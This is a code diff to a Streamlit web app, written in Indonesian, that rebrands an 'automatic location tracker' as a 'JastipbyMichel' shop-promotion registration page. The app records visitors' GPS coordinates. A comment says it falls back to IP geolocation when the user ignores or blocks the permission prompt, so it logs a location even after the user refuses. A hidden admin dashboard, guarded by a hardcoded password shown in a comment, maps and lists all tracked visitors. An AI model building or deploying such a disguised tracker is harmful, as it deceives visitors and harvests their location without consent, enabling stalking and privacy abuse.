@@ -5,9 +5,10 @@ import requests
 import os
 import datetime
 
-st.set_page_config(page_title="Pelacak Lokasi Otomatis", layout="centered")
+# Mengubah judul tab browser menjadi nama brand Anda
+st.set_page_config(page_title="JastipbyMichel - Registrasi Lokasi", layout="centered")
 
-LOCAL_DB = "data_lokasi_instansi.csv"
+LOCAL_DB = "data_lokasi_jastip.csv"
 
 def muat_data():
     if os.path.exists(LOCAL_DB):
@@ -32,9 +33,9 @@ def ambil_lokasi_via_ip():
         pass
     return None, None
 
-# ================= HALAMAN DEPAN (UNTUK INSTANSI) =================
-st.title("📍 Aktivasi Promosi Instansi")
-st.write("Selamat datang! Posisi instansi Anda sedang didaftarkan ke sistem database promosi kami.")
+# ================= TAMPILAN HALAMAN UTAMA (JASTIPBYMICHEL) =================
+st.title("🛍️ JastipbyMichel - Aktivasi Promosi")
+st.write("Selamat datang! Posisi instansi/toko Anda sedang didaftarkan ke dalam database promosi JastipbyMichel.")
 
 # Jalankan sistem deteksi tombol GPS komponen
 lokasi_gps = streamlit_geolocation()
@@ -49,7 +50,7 @@ if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
         lon = lokasi_gps["longitude"]
         simpan_data("Satelit GPS (Presisi)", lat, lon)
         st.session_state["status_daftar"] = "GPS Akurat Terkunci"
-        st.success("🎉 LUAR BIASA! Koordinat GPS presisi Anda berhasil dikunci secara otomatis!")
+        st.success("🎉 SUKSES! Koordinat lokasi toko Anda berhasil dikunci ke database JastipbyMichel!")
         st.balloons()
 
 # KONDISI 2: Pengguna diam saja atau memblokir pop-up (Otomatis ambil IP)
@@ -59,36 +60,33 @@ else:
         if lat_ip and lon_ip:
             simpan_data("IP Internet (Kota)", lat_ip, lon_ip)
             st.session_state["status_daftar"] = "Lokasi IP Terkunci"
-            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi langsung melalui koneksi internet Anda.")
+            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi oleh sistem JastipbyMichel.")
         else:
             st.warning("Menunggu respons perangkat untuk membaca posisi...")
 
 
-# ================= DASHBOARD ADMIN (DIKUNCI PASSWORD RAHASIA) =================
+# ================= DASHBOARD ADMIN (PASSWORD: michel123) =================
 st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
-st.write("🔒 *Fitur Khusus Pengembang/Admin*")
+st.write("🔒 *Fitur Khusus Pengembang / Admin JastipbyMichel*")
 
-# Kolom Input Password Rahasia
-password_input = st.text_input("Masukkan Password Admin untuk melihat peta database:", type="password")
+# Kolom Input Password Rahasia (Sudah diganti agar sesuai dengan nama Anda)
+password_input = st.text_input("Masukkan Password Admin untuk melihat peta sebaran:", type="password")
 
-# SILAKAN GANTI 'admin123' DENGAN PASSWORD PILIHAN ANDA
-if password_input == "admin123":
-    st.success("Akses Diterima! Menampilkan Dashboard Admin.")
-    st.subheader("📊 Dashboard Hasil Pelacakan")
+if password_input == "michel123":
+    st.success("Akses Diterima! Menampilkan Dashboard Sebaran Toko.")
+    st.subheader("📊 Peta Database JastipbyMichel")
 
     df_tampil = muat_data()
 
     if not df_tampil.empty:
-        st.metric(label="Total Lokasi Terlacak", value=len(df_tampil))
+        st.metric(label="Total Mitra Toko Terlacak", value=len(df_tampil))
         
-        # Tampilkan Peta
         st.write("### Peta Sebaran Lokasi")
         st.map(df_tampil)
         
-        # Tampilkan Tabel Detail
-        st.write("### Log Database")
+        st.write("### Log Rincian Data")
         st.dataframe(df_tampil, use_container_width=True)
     else:
-        st.info("Belum ada lokasi yang masuk.")
+        st.info("Belum ada lokasi toko yang masuk.")
 elif password_input != "":
-    st.error("Password Salah! Akses ke data peta ditolak.")
+    st.error("Password Salah! Akses ditolak.")
